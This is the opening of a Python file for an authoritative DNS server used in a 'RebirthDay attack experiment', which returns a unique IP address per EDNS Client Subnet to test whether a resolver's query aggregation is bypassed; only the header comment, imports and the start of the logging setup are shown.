# File: server.py
# Description: An authoritative DNS server for the RebirthDay attack experiment.
# This server is designed to respond with a unique IP address for each unique
# EDNS Client Subnet (ECS) it receives, proving that a resolver's query
# aggregation has been bypassed.

import time
import struct
import socket
import logging
import sys
import hashlib

# --- Basic Configuration ---
# Configure a logger for clear, immediate output. This is more robust than print().
